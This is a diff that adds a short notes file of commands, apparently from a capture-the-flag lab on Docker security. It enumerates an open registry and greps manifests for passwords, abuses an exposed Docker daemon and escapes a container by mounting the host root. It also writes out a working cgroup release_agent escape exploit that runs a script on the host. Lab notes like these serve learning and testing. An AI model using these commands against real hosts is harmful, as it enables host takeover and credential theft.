@@ -1,0 +1,35 @@
+# abusing docker registry
+curl -X GET http://docker-rodeo.thm:5000/v2/_catalog
+curl -X GET http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/tags/list
+curl -X GET http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/manifests/notsecure | grep -i 'password'
+
+# reverse engineering docker images
+# dive
+# https://github.com/wagoodman/dive#installation
+docker images
+dive IMAGE_ID
+
+# docker socket
+curl http://10.10.182.200:2375/version # testeando la vulnerabilidad..si nos muestra datos es vulnerable
+docker -H tcp://10.10.182.200:2375 ps
+docker -H tcp://10.10.182.200:2375 run
+docker -H tcp://10.10.182.200:2375 exec
+
+# Escape via Exposed Docker Daemon
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+# Misconfigured Privileges (capsh)
+capsh --print | grep 'sysadmin'
+
+# exploit:
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/exploit" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /exploit
+echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
+chmod a+x /exploit
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+
+
+
